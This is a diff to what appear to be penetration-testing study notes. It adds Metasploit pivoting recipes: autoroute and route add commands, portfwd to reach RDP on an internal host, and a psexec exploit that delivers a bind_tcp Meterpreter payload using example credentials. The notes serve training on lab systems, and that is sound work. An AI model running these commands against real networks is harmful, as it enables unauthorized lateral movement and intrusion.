@@ -346,6 +346,44 @@ On Kali — `/etc/proxychains.conf` must have `socks4 127.0.0.1 9050`. Then use 
 for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
 ```
 
+**multi/manage/autoroute module (reads pivot's own routing table automatically):**
+```bash
+# Background session first, then:
+use multi/manage/autoroute
+set SESSION 1
+run
+# Adds all subnets the pivot knows about automatically
+route print    # verify
+
+# Or add manually:
+route add 172.16.5.0/24 1   # route this subnet via session 1
+route print
+route flush                  # remove all
+```
+
+**portfwd (single-service, no proxychains):**
+```bash
+# Inside a Meterpreter session on the pivot host:
+portfwd add -l 3389 -p 3389 -r 172.16.5.200
+portfwd list
+# Kali's 127.0.0.1:3389 → pivot → 172.16.5.200:3389
+xfreerdp /v:127.0.0.1 /u:user   # connect directly, no proxychains
+```
+
+**Pivot via MSF route — use bind_tcp for second-hop exploits:**
+```bash
+# Routes only forward connections Kali initiates TO the target.
+# Internal target has no route back to Kali → reverse_tcp fails.
+# Use bind_tcp: Kali connects to the target's open port via the route.
+use exploit/windows/smb/psexec
+set RHOSTS 172.16.5.200
+set SMBUser luiza
+set SMBPass "Passw0rd!"
+set payload windows/x64/meterpreter/bind_tcp
+set LPORT 8000
+run   # session opens via session 1's route
+```
+
 **Socat + Meterpreter bind_tcp (when pivot host relays to an internal bind listener):**
 ```bash
 # On pivot host:
@@ -361,6 +399,14 @@ set LPORT 8080
 set RHOST <pivot-host-ip>
 run
 ```
+
+| Method | Best for | proxychains? |
+|---|---|---|
+| `route add` + MSF modules | Running MSF modules against internal hosts | No |
+| `autoroute` + `socks_proxy` | Non-MSF tools (xfreerdp, nmap, etc.) | Yes |
+| `portfwd` | Single service, quick access | No |
+
+Cross-link: [[The Metasploit Framework#21.3.3 Pivoting with Metasploit|Module 21 §21.3.3]]
 
 ---
 
